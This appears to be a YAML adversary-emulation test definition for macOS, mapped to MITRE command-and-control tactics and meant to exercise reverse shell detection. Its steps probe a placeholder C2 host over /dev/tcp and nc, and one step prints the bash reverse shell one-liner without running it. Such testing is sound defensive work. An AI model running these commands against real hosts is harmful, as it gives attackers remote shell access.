---
api_version: 2.0
uuid: 21d18623-16b8-46d4-8486-418d9d713b8d
name: Reverse Shell Setup Detection
authors:
- Claude Code
description: |
  Detects reverse shell setup and C2 callback attempts
mitre:
  tactics:
  - TA0011 Command and Control
  techniques:
  - T1059 Command and Scripting Interpreter
requirements:
  platforms:
  - os: darwin
args:
- name: c2_host
  description: C2 server IP or hostname
  type: string
  default: 192.168.1.100
- name: c2_port
  description: C2 server listening port
  type: integer
  default: 4444
- name: timeout
  description: Connection timeout in seconds
  type: integer
  default: 5
steps:
- name: check_port_connectivity
  description: Test connectivity to C2 port
  inline: |
    timeout {{ .Args.timeout }} bash -c "cat < /dev/null > /dev/tcp/{{ .Args.c2_host }}/{{ .Args.c2_port }}" && echo "Port {{ .Args.c2_port }} is open" || echo "Port {{ .Args.c2_port }} is closed"
- name: netcat_connection_test
  description: Test reverse shell with nc
  inline: |
    if command -v nc &> /dev/null; then
      timeout {{ .Args.timeout }} nc -zv {{ .Args.c2_host }} {{ .Args.c2_port }}
    else
      echo "nc not available"
    fi
- name: bash_reverse_shell_test
  description: Test bash reverse shell capability
  inline: |
    echo "Testing bash reverse shell capability..."
    echo "Would execute: bash -i >& /dev/tcp/{{ .Args.c2_host }}/{{ .Args.c2_port }} 0>&1" >&2
  cleanup:
    inline: |
      pkill -f "nc.*{{ .Args.c2_host }}.*{{ .Args.c2_port }}" 2>/dev/null || true
      pkill -f "bash.*{{ .Args.c2_host }}.*{{ .Args.c2_port }}" 2>/dev/null || true
tests:
- name: dry_run_test
  dry_run: true
